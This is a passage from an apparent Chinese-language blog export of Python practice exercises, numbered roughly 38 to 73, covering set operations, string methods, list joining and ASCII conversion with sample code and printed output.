class="string">'A'</span>&#125;</span><br><span class="line">    test_set_a - test_set_b = &#123;<span class="string">'B'</span>, <span class="string">'A'</span>&#125;</span><br></pre></td></tr></table></figure>

<p>38、返回两个集合 {‘A’,‘D’,‘B’} 和 {‘D’,‘E’,‘C’} 的并集</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test38</span><span class="params">()</span>:</span></span><br><span class="line">    test_set_a = &#123;<span class="string">'A'</span>,<span class="string">'D'</span>,<span class="string">'B'</span>&#125;</span><br><span class="line">    test_set_b = &#123;<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'C'</span>&#125;</span><br><span class="line">    print(<span class="string">"ori test_set_a = &#123;0&#125; test_set_b = &#123;1&#125;"</span>.format(test_set_a, test_set_b))</span><br><span class="line">    print(<span class="string">"res = &#123;0&#125;"</span>.format(test_set_a.union(test_set_b)))  <span class="comment"># + error</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_set_a = &#123;<span class="string">'B'</span>, <span class="string">'D'</span>, <span class="string">'A'</span>&#125; test_set_b = &#123;<span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>&#125;</span><br><span class="line">    res = &#123;<span class="string">'C'</span>, <span class="string">'B'</span>, <span class="string">'A'</span>, <span class="string">'E'</span>, <span class="string">'D'</span>&#125;</span><br></pre></td></tr></table></figure>

<p>39、返回两个集合 {‘A’,‘D’,‘B’} 和 {‘D’,‘E’,‘C’} 的交集</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test39</span><span class="params">()</span>:</span></span><br><span class="line">    test_set_a = &#123;<span class="string">'A'</span>,<span class="string">'D'</span>,<span class="string">'B'</span>&#125;</span><br><span class="line">    test_set_b = &#123;<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'C'</span>&#125;</span><br><span class="line">    print(<span class="string">"ori test_set_a = &#123;0&#125; test_set_b = &#123;1&#125;"</span>.format(test_set_a, test_set_b))</span><br><span class="line">    print(<span class="string">"res = &#123;0&#125;"</span>.format(test_set_a.intersection(test_set_b)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_set_a = &#123;<span class="string">'B'</span>, <span class="string">'D'</span>, <span class="string">'A'</span>&#125; test_set_b = &#123;<span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>&#125;</span><br><span class="line">    res = &#123;<span class="string">'D'</span>&#125;</span><br></pre></td></tr></table></figure>

<p>40、返回两个集合 {‘A’,‘D’,‘B’} 和 {‘D’,‘E’,‘C’} 未重复的元素的集合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test40</span><span class="params">()</span>:</span></span><br><span class="line">    test_set_a = &#123;<span class="string">'A'</span>,<span class="string">'D'</span>,<span class="string">'B'</span>&#125;</span><br><span class="line">    test_set_b = &#123;<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'C'</span>&#125;</span><br><span class="line">    print(<span class="string">"ori test_set_a = &#123;0&#125; test_set_b = &#123;1&#125;"</span>.format(test_set_a, test_set_b))</span><br><span class="line">    print(<span class="string">"res = &#123;0&#125;"</span>.format(test_set_a.symmetric_difference(test_set_b)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_set_a = &#123;<span class="string">'B'</span>, <span class="string">'D'</span>, <span class="string">'A'</span>&#125; test_set_b = &#123;<span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>&#125;</span><br><span class="line">    res = &#123;<span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'A'</span>, <span class="string">'E'</span>&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python语感专项</category>
      </categories>
      <tags>
        <tag>python语感</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>python语感专项-5</title>
    <url>/2020/02/15/blog_formal/%E5%BC%80%E5%8F%91/python/python100-5/</url>
    <content><![CDATA[<h1 id="python语感专项"><a href="#python语感专项" class="headerlink" title="python语感专项"></a>python语感专项</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>和我们学习任何一门语言一样，一个很重要的点就是培养语感，本文来自互联网整理+自己的见解</p>
<a id="more"></a>

<h2 id="第五拍"><a href="#第五拍" class="headerlink" title="第五拍"></a>第五拍</h2><p>41、判断两个集合 {‘A’,‘D’,‘B’} 和 {‘D’,‘E’,‘C’} 是否有重复元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test41</span><span class="params">()</span>:</span></span><br><span class="line">    test_set_a = &#123;<span class="string">'A'</span>,<span class="string">'D'</span>,<span class="string">'B'</span>&#125;</span><br><span class="line">    test_set_b = &#123;<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'C'</span>&#125;</span><br><span class="line">    print(<span class="string">"ori test_set_a = &#123;0&#125; test_set_b = &#123;1&#125;"</span>.format(test_set_a, test_set_b))</span><br><span class="line">    print(<span class="string">"res1 = &#123;0&#125;"</span>.format(<span class="keyword">not</span> test_set_a.isdisjoint(test_set_b)))</span><br><span class="line"></span><br><span class="line">    test_set_aa = &#123;<span class="string">'A'</span>,<span class="string">'F'</span>,<span class="string">'B'</span>&#125;</span><br><span class="line">    test_set_bb = &#123;<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'C'</span>&#125;</span><br><span class="line">    print(<span class="string">"ori test_set_aa = &#123;0&#125; test_set_bb = &#123;1&#125;"</span>.format(test_set_aa, test_set_bb))</span><br><span class="line">    print(<span class="string">"res2 = &#123;0&#125;"</span>.format(<span class="keyword">not</span> test_set_aa.isdisjoint(test_set_bb)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_set_a = &#123;<span class="string">'D'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>&#125; test_set_b = &#123;<span class="string">'D'</span>, <span class="string">'C'</span>, <span class="string">'E'</span>&#125;</span><br><span class="line">    res1 = <span class="literal">True</span></span><br><span class="line">    ori test_set_aa = &#123;<span class="string">'F'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>&#125; test_set_bb = &#123;<span class="string">'D'</span>, <span class="string">'C'</span>, <span class="string">'E'</span>&#125;</span><br><span class="line">    res2 = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>42、判断集合 {‘A’,‘C’} 是否是集合 {‘D’,‘C’,‘E’,‘A’} 的子集</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test42</span><span class="params">()</span>:</span></span><br><span class="line">    test_set_a = &#123;<span class="string">'A'</span>,<span class="string">'C'</span>&#125;</span><br><span class="line">    test_set_b = &#123;<span class="string">'D'</span>,<span class="string">'C'</span>,<span class="string">'E'</span>,<span class="string">'A'</span>&#125;</span><br><span class="line">    print(<span class="string">"ori test_set_a = &#123;0&#125; test_set_b = &#123;1&#125;"</span>.format(test_set_a, test_set_b))</span><br><span class="line">    print(<span class="string">"res = &#123;0&#125;"</span>.format(test_set_a.issubset(test_set_b)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_set_a = &#123;<span class="string">'C'</span>, <span class="string">'A'</span>&#125; test_set_b = &#123;<span class="string">'D'</span>, <span class="string">'C'</span>, <span class="string">'E'</span>, <span class="string">'A'</span>&#125;</span><br><span class="line">    res = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>43、去除数组 [1,2,5,2,3,4,5,‘x’,4,‘x’] 中的重复元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test43</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="string">'x'</span>,<span class="number">4</span>,<span class="string">'x'</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    print(<span class="string">"aft test_list = &#123;0&#125;"</span>.format(list(set(test_list))))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="string">'x'</span>, <span class="number">4</span>, <span class="string">'x'</span>]</span><br><span class="line">    aft test_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="string">'x'</span>]</span><br></pre></td></tr></table></figure>

<p>44、返回字符串 ‘abCdEfg’ 的全部大写、全部小写和大下写互换形式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test44</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r'abCdEfg'</span></span><br><span class="line">    print(<span class="string">"test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"upper = &#123;0&#125; lower = &#123;1&#125; swap = &#123;2&#125;"</span>.format(test_str.upper(), test_str.lower(), test_str.swapcase()))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    test_str = abCdEfg</span><br><span class="line">    upper = ABCDEFG lower = abcdefg swap = ABcDeFG</span><br></pre></td></tr></table></figure>

<p>45、判断字符串 ‘abCdEfg’ 是否首字母大写且其他字母为小写，字母是否全部小写，字母是否全部大写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test45</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r'abCdEfg'</span></span><br><span class="line">    print(<span class="string">"test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"res1 = &#123;0&#125; res2 = &#123;1&#125; res3 = &#123;2&#125;"</span>.format(test_str.istitle(),test_str.isupper(), test_str.islower()))</span><br><span class="line"></span><br><span class="line">    test_str = <span class="string">r'Abdfg Avvv'</span></span><br><span class="line">    <span class="comment"># istitle() 方法检测字符串中所有的单词拼写首字母是否为大写，且其他字母为小写</span></span><br><span class="line">    print(<span class="string">"test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"res1 = &#123;0&#125; res2 = &#123;1&#125; res3 = &#123;2&#125;"</span>.format(test_str.istitle(),test_str.isupper(), test_str.islower()))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    test_str = abCdEfg</span><br><span class="line">    res1 = <span class="literal">False</span> res2 = <span class="literal">False</span> res3 = <span class="literal">False</span></span><br><span class="line">    test_str = Abdfg Avvv</span><br><span class="line">    res1 = <span class="literal">True</span> res2 = <span class="literal">False</span> res3 = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>46、返回字符串 ‘this is python’ 首字母大写以及字符串内每个单词首字母大写形式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test46</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r"this is python"</span></span><br><span class="line">    print(<span class="string">"test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"res1 = &#123;0&#125; res2 = &#123;1&#125;"</span>.format(test_str.capitalize(), test_str.title()))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    test_str = this <span class="keyword">is</span> python</span><br><span class="line">    res1 = This <span class="keyword">is</span> python res2 = This Is Python</span><br></pre></td></tr></table></figure>

<p>47、判断字符串 ‘this is python’ 是否以 ‘this’ 开头，又是否以 ‘python’ 结尾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test47</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r"this is python"</span></span><br><span class="line">    print(<span class="string">"test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"res1 = &#123;0&#125; res2 = &#123;1&#125;"</span>.format(test_str.startswith(<span class="string">'this'</span>), test_str.endswith(<span class="string">'python'</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line">    test_str = this <span class="keyword">is</span> python</span><br><span class="line">    res1 = <span class="literal">True</span> res2 = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>48、返回字符串 ‘this is python’ 中 ‘is’ 的出现次数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test48</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r"this is python"</span></span><br><span class="line">    print(<span class="string">"test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"count of is = &#123;0&#125;"</span>.format(test_str.count(<span class="string">'is'</span>)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    test_str = this <span class="keyword">is</span> python</span><br><span class="line">    count of <span class="keyword">is</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>49、返回字符串 ‘this is python’ 中 ‘is’ 首次出现和最后一次出现的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test49</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r"this is python"</span></span><br><span class="line">    print(<span class="string">"test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"res1 = &#123;0&#125; res2 = &#123;1&#125;"</span>.format(test_str.find(<span class="string">'is'</span>), test_str.rfind(<span class="string">'is'</span>)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    test_str = this <span class="keyword">is</span> python</span><br><span class="line">    res1 = <span class="number">2</span> res2 = <span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>50、将字符串 ‘this is python’ 切片成3个单词</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test50</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r"this is python"</span></span><br><span class="line">    print(<span class="string">"test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"res = &#123;0&#125;"</span>.format(test_str.split()))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    test_str = this <span class="keyword">is</span> python</span><br><span class="line">    res = [<span class="string">'this'</span>, <span class="string">'is'</span>, <span class="string">'python'</span>]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python语感专项</category>
      </categories>
      <tags>
        <tag>python语感</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>python语感专项-6</title>
    <url>/2020/02/17/blog_formal/%E5%BC%80%E5%8F%91/python/python100-6/</url>
    <content><![CDATA[<h1 id="python语感专项"><a href="#python语感专项" class="headerlink" title="python语感专项"></a>python语感专项</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>和我们学习任何一门语言一样，一个很重要的点就是培养语感，本文来自互联网整理+自己的见解</p>
<a id="more"></a>

<h2 id="第六拍"><a href="#第六拍" class="headerlink" title="第六拍"></a>第六拍</h2><p>51、返回字符串 ‘blog.csdn.net/xufive/article/details/102946961’ 按路径分隔符切片的结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test51</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r'blog.csdn.net/xufive/article/details/102946961'</span></span><br><span class="line">    print(<span class="string">"ori test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"res test_str = &#123;0&#125;"</span>.format(test_str.split(<span class="string">r'/'</span>)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_str = blog.csdn.net/xufive/article/details/<span class="number">102946961</span></span><br><span class="line">    res test_str = [<span class="string">'blog.csdn.net'</span>, <span class="string">'xufive'</span>, <span class="string">'article'</span>, <span class="string">'details'</span>, <span class="string">'102946961'</span>]</span><br></pre></td></tr></table></figure>

<p>52、将字符串 ‘2.72, 5, 7, 3.14’ 以半角逗号切片后，再将各个元素转成浮点型或整形</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test52</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r'2.72, 5, 7, 3.14'</span>.split(<span class="string">','</span>)</span><br><span class="line">    print(<span class="string">"ori test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    <span class="comment"># res_int = [int(i).__int__ for i in test_str.split(',')]</span></span><br><span class="line">    res = [int(i) <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">'.'</span> <span class="keyword">in</span> i <span class="keyword">else</span> float(i) <span class="keyword">for</span> i <span class="keyword">in</span> test_str]</span><br><span class="line">    print(<span class="string">"res = &#123;0&#125;"</span>.format(res))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_str = [<span class="string">'2.72'</span>, <span class="string">' 5'</span>, <span class="string">' 7'</span>, <span class="string">' 3.14'</span>]</span><br><span class="line">    res = [<span class="number">2.72</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">3.14</span>]</span><br></pre></td></tr></table></figure>

<p>53、判断字符串 ‘adS12K56’ 是否完全为字母数字，是否全为数字，是否全为字母，是否全为ASCII码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test53</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r'adS12K56'</span></span><br><span class="line">    print(<span class="string">"ori test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    <span class="comment"># isalnum()  所有字符都是数字或者字母，为真返回 Ture，否则返回 False</span></span><br><span class="line">    <span class="comment"># isalpha()   所有字符都是字母，为真返回 Ture，否则返回 False</span></span><br><span class="line">    <span class="comment"># isdigit()     所有字符都是数字，为真返回 Ture，否则返回 False</span></span><br><span class="line">    <span class="comment"># istitle()      所有单词都是首字母大写，为真返回 Ture，否则返回 False</span></span><br><span class="line">    <span class="comment"># isspace()   所有字符都是空白字符，为真返回 Ture，否则返回 False</span></span><br><span class="line">    print(<span class="string">"res = &#123;0&#125; &#123;1&#125; &#123;2&#125; &#123;3&#125;"</span>.format(test_str.isalnum(), test_str.isdigit(), test_str.isalpha(), test_str.isascii()))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_str = adS12K56</span><br><span class="line">    res = <span class="literal">True</span> <span class="literal">False</span> <span class="literal">False</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>54、将字符串 ‘there is python’ 中的 ‘is’ 替换为 ‘are’</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test54</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r'there is python'</span></span><br><span class="line">    print(<span class="string">"ori test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"res test_str = &#123;0&#125;"</span>.format(test_str.replace(<span class="string">'is'</span>, <span class="string">'are'</span>)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">ori test_str = there <span class="keyword">is</span> python</span><br><span class="line">res test_str = there are python</span><br></pre></td></tr></table></figure>

<p>55、清除字符串 ‘\t python \n’ 左侧、右侧，以及左右两侧的空白字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test55</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r'\t python \n'</span></span><br><span class="line">    print(<span class="string">"ori test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"res test_str = &#123;0&#125;"</span>.format(test_str.strip(<span class="string">r'\t'</span>).strip(<span class="string">r'\n'</span>).strip()))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># or python2</span></span><br><span class="line">    <span class="comment"># test_str = r'\t python \n'</span></span><br><span class="line">    <span class="comment"># print("ori test_str = &#123;0&#125;".format(test_str))</span></span><br><span class="line">    <span class="comment"># print("resl test_str = &#123;0&#125;".format(test_str.lstrip()))</span></span><br><span class="line">    <span class="comment"># test_str = r'\t python \n'</span></span><br><span class="line">    <span class="comment"># print("ori test_str = &#123;0&#125;".format(test_str))</span></span><br><span class="line">    <span class="comment"># print("resr test_str = &#123;0&#125;".format(test_str.rstrip()))</span></span><br><span class="line">    <span class="comment"># test_str = r'\t python \n'</span></span><br><span class="line">    <span class="comment"># print("ori test_str = &#123;0&#125;".format(test_str))</span></span><br><span class="line">    <span class="comment"># print("res test_str = &#123;0&#125;".format(test_str.strip()))</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_str = \t python \n</span><br><span class="line">    res test_str = python</span><br></pre></td></tr></table></figure>

<p>56、将三个全英文字符串（比如，‘ok’, ‘hello’, ‘thank you’）分行打印，实现左对齐、右对齐和居中对齐效果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test56</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = [<span class="string">'ok'</span>, <span class="string">'hello'</span>, <span class="string">'thank you'</span>]</span><br><span class="line">    max_len = max([len(i) <span class="keyword">for</span> i <span class="keyword">in</span> test_str])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># left</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> test_str:</span><br><span class="line">        print(<span class="string">"&#123;0&#125;"</span>.format(item.ljust(max_len)))</span><br><span class="line">    <span class="comment"># right</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> test_str:</span><br><span class="line">        print(<span class="string">"&#123;0&#125;"</span>.format(item.rjust(max_len)))</span><br><span class="line">    <span class="comment"># center</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> test_str:</span><br><span class="line">        print(<span class="string">"&#123;0&#125;"</span>.format(item.center(max_len)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ok       </span><br><span class="line">    hello    </span><br><span class="line">    thank you</span><br><span class="line">           ok</span><br><span class="line">        hello</span><br><span class="line">    thank you</span><br><span class="line">        ok   </span><br><span class="line">      hello  </span><br><span class="line">    thank you</span><br></pre></td></tr></table></figure>

<p>57、将三个字符串（比如，‘Hello, 我是David’, ‘OK, 好’, ‘很高兴认识你’）分行打印，实现左对齐、右对齐和居中效果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test57</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = [<span class="string">'Hello, 我是David'</span>, <span class="string">'OK, 好'</span>, <span class="string">'很高兴认识你'</span>]</span><br><span class="line">    test_str_len = [len(i) <span class="keyword">for</span> i <span class="keyword">in</span> test_str]</span><br><span class="line">    test_str_len_gbk = [len(i.encode(<span class="string">'gbk'</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> test_str]</span><br><span class="line">    c_num = [a-b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(test_str_len_gbk, test_str_len)]</span><br><span class="line">    max_len = max(test_str_len_gbk)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># left</span></span><br><span class="line">    <span class="keyword">for</span> s, c <span class="keyword">in</span> zip(test_str, c_num):</span><br><span class="line">        print(<span class="string">"&#123;0&#125;"</span>.format(s.ljust(max_len-c)))</span><br><span class="line">    <span class="comment"># right</span></span><br><span class="line">    <span class="keyword">for</span> s, c <span class="keyword">in</span> zip(test_str, c_num):</span><br><span class="line">        print(<span class="string">"&#123;0&#125;"</span>.format(s.rjust(max_len-c)))</span><br><span class="line">    <span class="comment"># center</span></span><br><span class="line">    <span class="keyword">for</span> s, c <span class="keyword">in</span> zip(test_str, c_num):</span><br><span class="line">        print(<span class="string">"&#123;0&#125;"</span>.format(s.center(max_len-c)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line">    Hello, 我是David</span><br><span class="line">    OK, 好          </span><br><span class="line">    很高兴认识你    </span><br><span class="line">    Hello, 我是David</span><br><span class="line">              OK, 好</span><br><span class="line">        很高兴认识你</span><br><span class="line">    Hello, 我是David</span><br><span class="line">         OK, 好     </span><br><span class="line">      很高兴认识你</span><br></pre></td></tr></table></figure>

<p>58、将三个字符串 ‘15’, ‘127’, ‘65535’ 左侧补0成同样长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test58</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = [<span class="string">'15'</span>,<span class="string">'127'</span>,<span class="string">'65535'</span>]</span><br><span class="line">    max_len = max([len(i) <span class="keyword">for</span> i <span class="keyword">in</span> test_str])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> test_str:</span><br><span class="line">        print(<span class="string">"&#123;0&#125;"</span>.format(i.zfill(max_len)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    <span class="number">00015</span></span><br><span class="line">    <span class="number">00127</span></span><br><span class="line">    <span class="number">65535</span></span><br></pre></td></tr></table></figure>

<p>59、提取 url 字符串 ‘<a href="https://blog.csdn.net/xufive’" target="_blank" rel="noopener">https://blog.csdn.net/xufive’</a> 中的协议名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test59</span><span class="params">()</span>:</span></span><br><span class="line">    test_str = <span class="string">r'https://blog.csdn.net/xufive'</span></span><br><span class="line">    print(<span class="string">"ori test_str = &#123;0&#125;"</span>.format(test_str))</span><br><span class="line">    print(<span class="string">"res test_str = &#123;0&#125;"</span>.format(test_str.split(<span class="string">r'//'</span>)[<span class="number">0</span>][:<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># or</span></span><br><span class="line">    print(<span class="string">"res test_str = &#123;0&#125;"</span>.format(test_str.split(<span class="string">r'/'</span>, <span class="number">2</span>)[<span class="number">0</span>][:<span class="number">-1</span>]))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_str = https://blog.csdn.net/xufive</span><br><span class="line">    res test_str = https</span><br><span class="line">    res test_str = https</span><br></pre></td></tr></table></figure>

<p>60、将列表 [‘a’,‘b’,‘c’] 中各个元素用’|’连接成一个字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test60</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>]    </span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    print(<span class="string">"res test_list = &#123;0&#125;"</span>.format(<span class="string">'|'</span>.join(test_list)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_list = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>]</span><br><span class="line">    res test_list = a|b|c</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python语感专项</category>
      </categories>
      <tags>
        <tag>python语感</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>python语感专项-8</title>
    <url>/2020/02/19/blog_formal/%E5%BC%80%E5%8F%91/python/python100-8/</url>
    <content><![CDATA[<h1 id="python语感专项"><a href="#python语感专项" class="headerlink" title="python语感专项"></a>python语感专项</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>和我们学习任何一门语言一样，一个很重要的点就是培养语感，本文来自互联网整理+自己的见解</p>
<a id="more"></a>

<h2 id="第八拍"><a href="#第八拍" class="headerlink" title="第八拍"></a>第八拍</h2><p>71、返回字符 ‘a’ 和 ‘A’ 的ASCII编码值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test71</span><span class="params">()</span>:</span></span><br><span class="line">    test_char_a = <span class="string">'a'</span></span><br><span class="line">    test_char_b = <span class="string">'A'</span></span><br><span class="line">    print(<span class="string">"ori test_char_a = &#123;0&#125; test_char_b = &#123;1&#125;"</span>.format(test_char_a, test_char_b))</span><br><span class="line">    print(<span class="string">"res test_char_a = &#123;0&#125; test_char_b = &#123;1&#125;"</span>.format(ord(test_char_a), ord(test_char_b)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_char_a = a test_char_b = A</span><br><span class="line">    res test_char_a = <span class="number">97</span> test_char_b = <span class="number">65</span></span><br></pre></td></tr></table></figure>

<p>72、返回ASCII编码值为 57 和 122 的字符。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test72</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"chr(57) = &#123;0&#125; chr(122) = &#123;1&#125;"</span>.format(chr(<span class="number">57</span>), chr(<span class="number">122</span>)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    chr(<span class="number">57</span>) = <span class="number">9</span> chr(<span class="number">122</span>) = z</span><br></pre></td></tr></table></figure>

<p>73、将二维列表 [[0.468,0.975,0.446],[0.718,0.826,0.359]] 写成名为 csv_data 的 csv 格式的文件，并尝试用 excel 打开它</p>
